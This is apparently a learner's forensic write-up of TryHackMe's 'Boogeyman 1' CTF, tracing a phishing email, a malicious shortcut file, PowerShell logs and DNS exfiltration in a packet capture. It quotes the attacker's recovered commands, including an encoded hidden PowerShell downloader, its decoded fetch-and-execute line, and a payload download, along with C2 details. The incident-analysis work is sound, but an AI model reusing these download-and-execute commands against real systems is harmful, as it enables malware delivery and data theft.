# ⚠️ Ethical Use Notice
These notes are based on a **lab-based simulation** from TryHackMe's 'Boogeyman 1' CTF challenge.
All domains, tools, and data are used purely for **educational and ethical hacking purposes**.
Real-world exploitation, unauthorized scanning, or any form of illegal activity is strictly condemned.

# Boogeyman 1 CTF Notes

**Overview**:  
These notes document my investigation process for the Boogeyman 1 Capture The Flag (CTF) challenge on TryHackMe. The challenge involved analyzing a phishing attack, investigating malicious PowerShell activity, and performing network forensics to uncover data exfiltration. The notes showcase skills in email analysis, command-line tools (`unzip`, `lnkparse`, `jq`), PowerShell log parsing, and network analysis with Wireshark and Tshark. The Tshark section was inspired by a TryHackMe walkthrough, which helped deepen my familiarity with the tool.

**Skills Demonstrated**:  
- Email and phishing analysis  
- File extraction and analysis (`unzip`, `lnkparse`, CyberChef)  
- PowerShell log parsing (`jq`, `grep`)  
- Network forensics (Wireshark, Tshark)  
- Understanding of malware execution and data exfiltration techniques

**Personal Notes**:  
The attacker used `sq3.exe` to target an SQLite database, likely for data extraction. This is a critical artifact for future investigations.

## Email Investigation

**Phish Email Details**:  
- Sender: `[redacted-sender]@bpackaging.xyz`  
- Victim: `[redacted-victim]@hotmail.com`

**Zip File Analysis**:  
- Command: `unzip -l Invoice.zip`  
  - **Purpose**: Lists the contents of `Invoice.zip` without extracting, revealing a password-protected file named `Invoice_20230103.lnk`.

- Found password in email data: `invoice2023!`  
- Command: `unzip -P invoice2023! Invoice.zip`  
  - **Purpose**: Extracts the contents of `Invoice.zip` using the provided password, inflating the file `Invoice_20230103.lnk`.

**LNK File Analysis**:  
- Used `lnkparse` on `Invoice_20230103.lnk` to extract embedded command line arguments:  
  - Encoded command: `-nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAYwBrAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==`  
  - **Purpose**: `lnkparse` extracts metadata and command line arguments from the Windows shortcut (.lnk) file.

- Decoded using CyberChef with 'From Base64' and 'Remove null bytes':  
  - Result: `iex (new-object net.webclient).downloadstring('http://files.bpackaging.xyz/update')`  
  - **Purpose**: The decoded PowerShell command uses `Invoke-Expression` (`iex`) to execute a script downloaded from `http://files.bpackaging.xyz/update` using the `net.webclient` object, likely retrieving and running malicious code.

**Notes**:  
- The purpose of the downloaded script requires further investigation to understand its full impact.

---

## Endpoint Investigation

**PowerShell Artifacts**:  
- Found in `powershell.json` within the Artefacts folder:  
  - Suspicious GitHub URL: `hxxps[://]github[.]com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt[.]ps1`  
    - **Purpose**: References `Invoke-Seatbelt`, a PowerShell tool for system enumeration, possibly used by the attacker.

- Suspicious command:  
  - `iwr hxxp[://]files[.]bpackaging[.]xyz/sq3[.]exe -outfile sq3[.]exe;pwd`  
    - **Purpose**: Uses `Invoke-WebRequest` (`iwr`) to download `sq3.exe` from the malicious domain and saves it as `sq3.exe`. The `pwd` command outputs the current working directory.

**Extracted Domains (Defanged)**:  
- `cdn[.]bpackaging[.]xyz`  
- `files[.]bpackaging[.]xyz`

**Additional Findings**:  
- File path: `C:\Users\j.westcott\Documents\protected_data.kdbx;pwd`  
  - **Purpose**: Indicates a KeePass database file (`protected_data.kdbx`) and the `pwd` command, likely used to verify the current directory.

- Encoded PowerShell command:  
  - `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABiAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAd`  
  - **Purpose**: An encoded PowerShell command, likely executing a downloaded script in a hidden window, similar to the .lnk file’s command.

**Commands for Parsing `powershell.json`**:  
- Note: The TryHackMe Boogeyman 1 room provided the `{}` syntax for `jq` filtering. I selected the specific field names (`path`, `ContextInfo`, `ScriptBlockText`, and `ContextInfo, ScriptBlockText`) to extract relevant data, enabling targeted analysis of file paths, context, and script content.  
- `cat powershell.json | jq '{path}'`  
  - **Purpose**: Extracts the `path` field from `powershell.json` using `jq` to identify file paths in the logs.

- `cat powershell.json | jq '{ContextInfo}'`  
  - **Purpose**: Extracts the `ContextInfo` field, providing contextual details about PowerShell execution (e.g., user or process information).

- `cat powershell.json | jq '{ScriptBlockText}'`  
  - **Purpose**: Extracts the `ScriptBlockText` field, revealing the executed PowerShell script content.

- `cat powershell.json | grep AppData`  
  - **Purpose**: Searches for references to the `AppData` directory, identifying paths like `plum.sqlite`.

- Found: `.\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\;pwd`  
  - **Purpose**: Indicates `sq3.exe` targeted the Microsoft Sticky Notes directory, likely accessing `plum.sqlite`. The `pwd` command confirms the working directory.

- Reconstructed Path:  
  - `C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`  
  - **Purpose**: Identifies the SQLite database (`plum.sqlite`) used by Microsoft Sticky Notes, likely containing sensitive data like passwords.

- Note: `sq3.exe` was used to view and possibly exfiltrate data from `plum.sqlite`. The exfiltrated file was `protected_data.kdbx`.

- Command: `cat powershell.json | jq '{ContextInfo, ScriptBlockText}'`  
  - **Purpose**: Extracts both `ContextInfo` and `ScriptBlockText` fields for detailed analysis of script execution.

- Command: `cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' | jq '{ScriptBlockText}' | sort | uniq -c`  
  - **Purpose**: Sorts PowerShell logs by timestamp, extracts unique `ScriptBlockText` entries with their occurrence count, identifying repeated malicious commands.

**Data Exfiltration Details**:  
- The attacker used the `.split` method to fragment `protected_data.kdbx` into pieces, encoding them in hexadecimal for transmission to their Command and Control (C2) server.  
- **C2 Details**:  
  - IP: `167[.]71[.]211[.]113`  
  - Domain: `cdn.bpackaging.xyz`  
  - Port: `8080`  
- The attacker abused the Windows `nslookup` service for data transmission, likely via DNS queries.

---

## Network Investigation

**Wireshark Analysis**:  
- Filter: `http contains "files.bpackaging.xyz"`  
  - **Purpose**: Identifies HTTP traffic involving the malicious domain. Packet 42702’s TCP stream showed the attacker used Python to host the site.

- Observations:  
  - HTTP POST requests were used to send command outputs to the C2 server.  
  - DNS was used during data exfiltration.  
  - `sq3.exe` extracted the password `[redacted-lab-password]` for `protected_data.kdbx` from `plum.sqlite`.

**Tshark Commands**:  
- Note: This section was inspired by a TryHackMe walkthrough, which provided guidance on Tshark filters and enhanced my familiarity with the tool.  
- `tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name -e dns.qry.type`  
  - **Purpose**: Extracts DNS query names and types from `capture.pcapng` to analyze DNS traffic.

- `tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpackaging.xyz"`  
  - **Purpose**: Filters DNS queries for the malicious domain `bpackaging.xyz`.

- `tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpackaging.xyz" | cut -f1 -d '.'`  
  - **Purpose**: Extracts subdomains (e.g., `files` or `cdn`) from DNS queries.

- `tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpackaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn"`  
  - **Purpose**: Excludes `files` and `cdn` subdomains to identify other potential subdomains.

- `tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpackaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" | uniq | tr -d '\n'`  
  - **Purpose**: Removes duplicates and concatenates results into a single line by removing newlines (`tr -d '\n'`).

- `tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpackaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" | uniq | tr -d '\n' > output.txt`  
  - **Purpose**: Saves filtered, unique subdomains to `output.txt`.

- `>> ~/Desktop/answers.txt`  
  - **Purpose**: Appends output to `answers.txt` on the Desktop, preserving existing data.

**Reconstructing Exfiltrated Data**:  
- Use CyberChef with the 'From Hex' recipe to decode hex-encoded data.  
- Save the output with a `.kdbx` extension.  
- **Caution**: Reconstruct and open `protected_data.kdbx` in a virtual machine or sandbox to avoid malware risks.  
- Use a KeePass-compatible program with the password `[redacted-lab-password]` to view the contents and retrieve the final CTF answer.

---

**ASCII Art**:  

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣔⠒⠀⠉⠉⠢⡀⠀⠀⠀⠀⠀⠀⠀  
⠀⠀⠀⠀⠀⠀⣀⣀⠠⠄⠒⠘⢿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀  
⢺⣦⢻⣿⣿⣿⣿⣄⠀⠀⠀⠀⠈⢿⡿⠿⠛⠛⠐⣶⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀  
⠈⢿⣧⢻⣿⣿⣿⣿⣆⣀⣠⣴⣶⣿⡄⠀⠀⠀⠀⠘⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀  
⠀⠀⢿⣧⢋⠉⠀⠀⠀⠹⣿⣿⣿⣿⣿⡆⣀⣤⣤⣶⣮⠀⠀⠀⠀⠣⠀⠀⠀⠀  
⠀⠀⠈⢿⣧⢂⠀⠀⠀⠀⢘⠟⠛⠉⠁⠀⠹⣿⣿⣿⣿⣷⡀⠀⠀⠀⢣⠀⠀⠀  
⠀⠀⠀⠈⢿⣧⢲⣶⣾⣿⣿⣧⡀⠀⠀⠀⢀⣹⠛⠋⠉⠉⠉⢿⣿⣿⣿⣧⠀⠀  
⠀⠀⠀⠀⠀⢿⣧⢻⣿⣿⣿⡿⠷⢤⣶⣿⣿⣿⣧⡀⠀⠀⠀⠈⢻⣿⣿⣿⣧⠀  
⠀⠀⠀⠀⠀⠈⢿⣧⢛⠉⠁⠀⠀⠀⢻⣿⣿⣿⡿⠗⠒⠒⠈⠉⠉⠉⠙⡉⠛⡃  
⠀⠀⠀⠀⠀⠀⠈⢿⣯⢂⠀⠀⠀⡀⠤⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀  
⠀⠀⠀⠀⠀⠀⠀⠈⢿⣯⠐⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  

===FINISH CTF===
